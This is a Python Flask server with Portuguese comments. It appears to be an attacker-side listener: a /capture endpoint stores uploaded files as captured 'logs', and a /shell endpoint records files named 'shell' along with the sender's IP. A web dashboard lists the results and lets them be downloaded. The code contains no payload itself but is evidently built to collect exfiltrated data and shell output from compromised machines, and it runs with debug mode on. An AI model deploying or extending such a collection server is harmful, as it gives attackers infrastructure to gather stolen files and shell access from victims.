from flask import Flask, request, jsonify, render_template, send_from_directory
import os
import datetime
import sqlite3

app = Flask(__name__)

# Limite de 50MB por arquivo
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

# Diretórios para armazenar os arquivos
UPLOAD_FOLDER = "logs"
SHELL_FOLDER = "shells"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(SHELL_FOLDER, exist_ok=True)

# Arquivo do banco de dados
DB_FILE = "logs.db"

def init_db():
    """Inicializa o banco de dados SQLite"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                filename TEXT NOT NULL,
                content TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS shells (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                content TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()

# Inicializa o banco de dados
init_db()

@app.route("/", methods=["GET"])
def index():
    """Exibe os logs e shells armazenados"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT id, filename, content, timestamp FROM logs ORDER BY timestamp DESC")
        logs = cursor.fetchall()

        cursor.execute("SELECT id, ip, content, timestamp FROM shells ORDER BY timestamp DESC")
        shells = cursor.fetchall()

    return render_template("index.html", logs=logs, shells=shells)

@app.route('/capture', methods=['POST'])
def capture():
    """Recebe arquivos e os armazena na pasta 'logs'"""
    # Obtém o arquivo enviado
    file = request.files.get("file")
    
    # Verifica se o arquivo foi enviado
    if not file:
        return jsonify({"error": "Nenhum arquivo enviado"}), 400

    # Armazena o nome do arquivo e o conteúdo
    filename = file.filename
    file_content = file.read().decode("utf-8", errors="ignore")  # Para arquivos de texto
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

    # Caminho do arquivo a ser salvo
    filepath = os.path.join(UPLOAD_FOLDER, f"{filename}_{timestamp}")
    
    # Salva o arquivo na pasta logs
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(file_content)

    # Salva no banco de dados
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO logs (filename, content) VALUES (?, ?)", (filename, file_content))
        conn.commit()

    return jsonify({"message": "Arquivo recebido e salvo"}), 200

@app.route('/shell', methods=['POST'])
def shell():
    """Recebe arquivos chamados 'shell' e os exibe na aba 'Shells Recebidas'"""
    file = request.files.get("file")
    if not file or file.filename != "shell":
        return jsonify({"error": "Apenas arquivos chamados 'shell' são permitidos"}), 400

    file_content = file.read().decode("utf-8", errors="ignore")
    ip = request.remote_addr  
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

    shell_filepath = os.path.join(SHELL_FOLDER, f"shell_{timestamp}.txt")
    with open(shell_filepath, "w", encoding="utf-8") as f:
        f.write(file_content)

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO shells (ip, content) VALUES (?, ?)", (ip, file_content))
        conn.commit()

    return jsonify({"message": "Shell recebido"}), 200

@app.route('/shell_content/<int:id>', methods=['GET'])
def shell_content(id):
    """Retorna o conteúdo do shell pelo ID"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT content FROM shells WHERE id = ?", (id,))
        result = cursor.fetchone()

    if result:
        return jsonify({"content": result[0]}), 200
    else:
        return jsonify({"error": "Shell não encontrado"}), 404

# Novo endpoint para retornar o conteúdo do log
@app.route('/log_content/<int:id>', methods=['GET'])
def log_content(id):
    """Retorna o conteúdo do log pelo ID"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT content FROM logs WHERE id = ?", (id,))
        result = cursor.fetchone()

    if result:
        return jsonify({"content": result[0]}), 200
    else:
        return jsonify({"error": "Log não encontrado"}), 404

@app.route('/download/<filename>')
def download_file(filename):
    """Permite o download de um arquivo armazenado"""
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

if __name__ == "__main__":
    HOST = "192.168.2.103"
    PORT = 5001
    print(f"[+] Servidor rodando em http://{HOST}:{PORT}")
    app.run(host=HOST, port=PORT, debug=True)
